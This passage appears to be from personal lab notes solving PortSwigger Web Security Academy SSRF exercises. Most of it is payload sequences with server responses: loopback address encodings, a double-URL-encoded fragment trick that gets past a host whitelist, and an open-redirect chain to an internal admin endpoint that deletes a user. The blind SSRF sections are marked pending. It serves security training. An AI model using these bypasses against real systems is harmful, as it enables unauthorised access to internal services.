                                            (stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=4&storeId=1)
    ```

    ```plaintext
    stockApi=http://127.0.0.1                                       "External stock check host must be stock.weliketoshop.net"
    stockApi=http://127.1                                           "External stock check host must be stock.weliketoshop.net"
    stockApi=http://2130706433                                      "External stock check host must be stock.weliketoshop.net"
    stockApi=http://017700000001                                    "External stock check host must be stock.weliketoshop.net"
    stockApi=http://0x7f000001                                      "External stock check host must be stock.weliketoshop.net"
    stockApi=http://localhost                                       "External stock check host must be stock.weliketoshop.net"
    stockApi=http://stock.weliketoshop.net:8080                     "Missing parameter"
    stockApi=http://test@stock.weliketoshop.net:8080                "Missing parameter"
    stockApi=http://test#@stock.weliketoshop.net:8080               "External stock check host must be stock.weliketoshop.net"
    stockApi=http://test%23@stock.weliketoshop.net:8080             "External stock check host must be stock.weliketoshop.net"
    stockApi=http://test%25%32%33@stock.weliketoshop.net:8080       500 ISE, "Could not connect to external stock check service"
    stockApi=http://localhost%25%32%33@stock.weliketoshop.net:8080  200 OK

    stockApi=http://localhost%25%32%33@stock.weliketoshop.net:8080/admin
    stockApi=http://localhost%25%32%33@stock.weliketoshop.net:8080/admin/delete?username=carlos
    ```

5. #### **SSRF with filter bypass via open redirection vulnerability**

    ```plaintext
    https://<lab_url>/product               GET   (productId=5)
    https://<lab_url>/product/stock         POST  (stockApi=/product/stock/check?productId=5&storeId=2)
    https://<lab_url>/product/nextProduct   GET   (currentProductId=5&path=/product?productId=6)
    ```

    ```plaintext
    stockApi=/product/stock/check?productId=5%26storeId=2
    stockApi=/product/nextProduct?currentProductId=5%26path=/product?productId=6
    stockApi=/product/nextProduct?currentProductId=5%26path=http://127.0.0.1                 (200 OK)
    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12              (500 ISE)
    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12:8080         (404 Not Found)

    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12:8080/admin
    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12:8080/admin/delete?username=carlos
    ```

### [Blind SSRF vulnerabilities][ssrf_blind_vulnerabilities]

6. #### **Blind SSRF with out-of-band detection**

```plaintext
PENDING UNTIL I GET THE BURP SUITE PRO VERSION
```

7. #### **Blind SSRF with Shellshock exploitation**

```plaintext
PENDING UNTIL I GET THE BURP SUITE PRO VERSION
```

[ssrf]:                       https://portswigger.net/web-security/ssrf
[ssrf_common_attacks]:        https://portswigger.net/web-security/ssrf#common-ssrf-attacks
[ssrf_blind_vulnerabilities]: https://portswigger.net/web-security/ssrf/blind

---

<!--
## **XXE Injection**

<br>

# Client-Side Topics

## **Cross-Site Scripting (XSS)**

## **Cross-Site Request Forgery (CSRF)**

## **Cross-Origin Resource Sharing (CORS)**

## **Clickjacking**

## **DOM-Based Vulnerabilities**

## **WebSockets**

<br>

# Advanced Topics

## **Insecure Deserialization**

## **Server-Side Template Injection**

## **Web Cache Poisoning**

## **HTTP Host Header Attacks**

## **HTTP Request Smuggling**

## **OAuth Authentication**

-->
